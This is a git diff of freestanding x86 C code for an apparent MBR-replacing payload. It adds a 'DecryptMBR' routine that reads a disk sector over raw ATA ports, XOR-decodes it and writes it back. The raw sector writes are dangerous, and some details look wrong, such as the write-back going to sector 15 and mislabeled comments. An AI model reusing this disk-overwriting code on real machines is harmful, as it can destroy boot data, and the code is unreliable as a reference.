@@ -45,8 +45,9 @@ enum color
 #define ATA_LBA_LOW      0x1F3  // LBA low byte
 #define ATA_LBA_MID      0x1F4  // LBA mid byte
 #define ATA_LBA_HIGH     0x1F5  // LBA high byte
-#define ATA_DRIVE_SELECT 0x1F6  // Drive & Head Select
+#define ATA_DRIVE		 0x1F6  // Drive & Head Select
 #define ATA_COMMAND      0x1F7  // Command Register (W) / Status Register (R)
+#define ATA_STATUS       0x1F7  // Status (R) / Command (W)
 #define ATA_ALT_STATUS   0x3F6  // Alternate Status (R) / Device Control (W)
 
 // ATA Commands
@@ -99,15 +100,22 @@ void ClearScreen(enum color color);
 void Print(const char* string, int x, int y, enum color color);
 void Sleep(uint32_t cycles);
 uint8_t inb(uint16_t port);
+uint16_t inw(uint16_t port);
 void outb(uint16_t port, uint8_t data);
+void outw(uint16_t port, uint16_t data);
 void SetCursorPos(int x, int y);
+void itoa(int num, char* str);
 uint8_t GetScanCode();
 uint8_t GetKeyPress();
+
+void byteToHexStr(uint8_t byte, char* str);
 
 
 void Stage1(int col);
 void Stage2();
 void Stage3();
+
+void DecryptMBR();
 
 
 
@@ -123,27 +131,26 @@ void _start()
 	}
 
 
-	//while(1)
-	//{
+	while(1)
+	{
+
+		Stage1(1);
+		Sleep(80000000);
+		Stage1(2);
+		Sleep(80000000);
 
 
-
-	//	Stage1(1);
-	//	Sleep(80000000);
-	//	Stage1(2);
-	//	Sleep(80000000);
-
-
-	//	if (inb(KBD_STATUS_PORT) & 0x01) // if bit 0 is set, data is available 
-	//	{
-	//		//uint8_t scancode = inb(KBD_DATA_PORT);
-	//		break;
-	//	
-	//	}
-	//}
+		if (inb(KBD_STATUS_PORT) & 0x01) // if bit 0 is set, data is available 
+		{
+			//uint8_t scancode = inb(KBD_DATA_PORT);
+			break;
+		
+		}
+	}
 	
 
 	Stage2();
+
 
 
 	while (1)
@@ -152,21 +159,33 @@ void _start()
 	}
 }
 
-// Simple I/O port read function
-uint8_t inb(uint16_t port) 
+// Simple I/O port read function (byte)
+uint8_t inb(uint16_t port)
 {
 	uint8_t data;
 	__asm__ volatile("inb %1, %0" : "=a"(data) : "Nd"(port));
 	return data;
 }
 
-// Simple I/O port write function
-void outb(uint16_t port, uint8_t data) 
+// Simple I/O port write function (byte)
+void outb(uint16_t port, uint8_t data)
 {
 	__asm__ volatile("outb %0, %1" : : "a"(data), "Nd"(port));
 }
 
+// Simple I/O port write function (word)
+uint16_t inw(uint16_t port) 
+{
+	uint16_t data;
+	asm volatile ("inw %1, %0" : "=a"(data) : "Nd"(port));
+	return data;
+}
 
+// Simple I/O port write function (word)
+void outw(uint16_t port, uint16_t data)
+{
+	__asm__ volatile("outw %0, %1" : : "a"(data), "Nd"(port));
+}
 
 void Print(const char* string, int x, int y, enum color color)
 {
@@ -216,6 +235,58 @@ void SetCursorPos(int x, int y)
 	outb(VGA_IO_DATA, (uint8_t)(position & 0xFF)); // Write the low byte of position
 }
 
+
+void itoa(int num, char* str) 
+{
+	int i = 0;
+	int isNegative = 0;
+
+	// Handle 0 explicitly, otherwise empty string is printed
+	if (num == 0) {
+		str[i++] = '0';
+		str[i] = '\0';
+		return;
+	}
+
+	// Handle negative numbers
+	if (num < 0) {
+		isNegative = 1;
+		num = -num;  // Make num positive
+	}
+
+	// Process individual digits
+	while (num != 0) {
+		str[i++] = (num % 10) + '0';  // Get the next digit
+		num = num / 10;  // Reduce num
+	}
+
+	// Append negative sign for negative numbers
+	if (isNegative) {
+		str[i++] = '-';
+	}
+
+	str[i] = '\0';  // Null-terminate the string
+
+	// Reverse the string as we've processed digits in reverse order
+	int start = 0;
+	int end = i - 1;
+	while (start < end) {
+		char temp = str[start];
+		str[start] = str[end];
+		str[end] = temp;
+		start++;
+		end--;
+	}
+}
+
+
+void byteToHexStr(uint8_t byte, char* str) 
+{
+	const char hexChars[] = "0123456789ABCDEF";  // Hexadecimal characters
+	str[0] = hexChars[(byte >> 4) & 0x0F];      // Upper nibble
+	str[1] = hexChars[byte & 0x0F];             // Lower nibble
+	str[2] = '\0';  // Null-terminate the string
+}
 
 
 //Gets the scancode of the key pressed
@@ -444,8 +515,137 @@ void Stage3()
 		addr++;
 	}
 
-	Sleep(100000000000);
-	Print("Please reboot your computer!", 0, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
+	DecryptMBR();
+
+
+	for (int i = 0; i < VGA_WIDTH * VGA_HEIGHT; i++)
+	{
+		*addr = ' ';
+		addr++;
+		*addr = VGA_COLOR_LIGHT_GREY | VGA_COLOR_LIGHT_GREY << 4;
+		addr++;
+	}
+
+
+	Print("Please reboot your computer!", 0, 2, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
+
+	return;
+
+}
+
+
+
+
+void DecryptMBR()
+{
+
+	Print("called ", 0, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
+
+
+
+	uint8_t buffer[512] = {0};
+
+	//master drive
+	outb(ATA_DRIVE, 0xE0);
+
+	//only 1 sector needs to be read
+	outb(ATA_SECTOR_COUNT, 1);
+
+	// Send LBA address (28-bit)
+	outb(ATA_LBA_LOW, 15 & 0xFF);
+	outb(ATA_LBA_MID, (15 >> 8) & 0xFF);
+	outb(ATA_LBA_HIGH, (15 >> 16) & 0xFF);
+
+	//send read command
+	outb(ATA_COMMAND, ATA_CMD_READ);
+
+	//wait for disk to finish
+	while (inb(ATA_STATUS) & 0x80);
+	while (!(inb(ATA_STATUS) & 0x08));
+
+
+	uint16_t* buf16 = (uint16_t*)buffer; //data in ATA_DATA is in word size, not byte
+
+	for (int i = 0; i < 512; i += 2)
+	{
+		Print("Reading sector: ", 0, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
+
+
+		char str[10];
+
+		itoa(i, str);
+
+		Print(str, 16, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
+
+
+		Print("/ 512", 20, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
+
+
+		if (i == 510)
+		{
+			Print("512 / 512 Done!", 16, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
+		}
+
+		//Sleep(9000000);
+
+		uint16_t data = inw(ATA_DATA);
+		
+		buffer[i] = (uint8_t)(data & 0xFF);				// Lower byte
+		buffer[i + 1] = (uint8_t)((data >> 8) & 0xFF);  // Upper byte
+
+	}
+
+
+
+	uint8_t lastByte = (uint8_t)(buffer[511]);
+
+	if ((lastByte ^ 0x28) == 0xAA)
+	{
+		Print("Bootloader found", 0, 5, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
+
+		for (int i = 0; i < 512; i++)
+		{
+			uint8_t byte = buffer[i];
+			byte = byte ^ 0x28;
+			buffer[i] = byte;
+		}
+		
+		
+		//master drive
+		outb(ATA_DRIVE, 0xE0);
+
+		//only 1 sector needs to be written
+		outb(ATA_SECTOR_COUNT, 1);
+
+		// Send LBA address (28-bit)
+		outb(ATA_LBA_LOW, 15 & 0xFF);
+		outb(ATA_LBA_MID, (15 >> 8) & 0xFF);
+		outb(ATA_LBA_HIGH, (15 >> 16) & 0xFF);
+
+		//send read command
+		outb(ATA_COMMAND, ATA_CMD_WRITE);
+		
+		while (inb(ATA_STATUS) & 0x80);  // Wait for busy flag to clear
+		while (!(inb(ATA_STATUS) & 0x40));  // Wait for ready flag
+
+
+		uint16_t* buf16 = (uint16_t*)buffer;
+		for (int i = 0; i < 256; i++) 
+		{
+			outw(ATA_DATA, buf16[i]);  // Write word (2 bytes) to ATA data register
+		}
+
+
+		outb(ATA_COMMAND, 0xE7); //cache flush
+
+		return;
+
+	}
+	else
+	{
+		Print("MBR error", 0, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
+	}
+
 
 	return;
 
